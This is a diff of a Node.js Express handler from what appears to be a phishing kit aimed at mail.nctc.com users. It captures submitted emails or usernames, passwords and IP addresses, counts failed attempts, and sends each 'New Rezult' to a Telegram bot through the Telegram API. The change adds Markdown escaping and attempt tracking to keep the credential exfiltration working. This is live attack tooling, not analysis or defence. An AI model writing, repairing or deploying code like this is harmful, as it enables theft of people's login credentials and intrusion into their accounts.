@@ -27,8 +27,15 @@ app.post("/", async (req, res) => {
         return res.redirect('https://mail.nctc.com/')
     }
 
-    const message = `🔹🌍🌍 **New Rezult** 🌍🌍🔹\n📧 Email: ${email}\n🔑 Password: ${password}\n🌍 IP: ${ip}\n🕒 Time: ${new Date().toISOString()}\n🌍🌍REDDOT_SECURITY🌍🌍`;
+    const escapeMarkdown = (text) => {
+    return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, "\\$&"); // Escape special characters
+};
 
+const message = escapeMarkdown(`🔴 New Rezult
+👤 Email: ${username}
+🛑 Password: ${password}
+📍 IP: ${ip}
+🚨 Attempt: ${failedAttempts[ip]}`);
     try {
         // Send to Telegram
         await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
